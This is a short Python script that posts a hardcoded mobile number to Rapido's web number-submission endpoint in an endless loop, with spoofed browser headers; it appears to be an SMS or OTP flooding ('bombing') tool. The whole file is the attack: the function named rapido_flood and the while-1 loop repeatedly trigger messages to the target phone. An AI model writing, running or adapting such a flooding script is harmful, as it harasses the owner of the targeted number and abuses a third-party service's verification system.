import requests


def rapido_flood(mobile):
    url = "https://rapido.bike/webnumber"

    payload = "{\"mobile\":\"" + mobile + "\"}"
    headers = {
        'Accept': "*/*",
        'Accept-Encoding': "gzip, deflate, br",
        'Accept-Language': "en-US,en;q=0.9",
        'Access-Control-Allow-Origin': "*",
        'Cache-Control': "no-cache",
        'Connection': "keep-alive",
        'Content-Length': "23",
        'Content-Type': "application/json",
        'Host': "rapido.bike",
        'Origin': "https://rapido.bike",
        'Referer': "https://rapido.bike/",
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
    }

    response = requests.post(url, data=payload, headers=headers).json()

    print(response)


while 1:
    rapido_flood('9898989898')
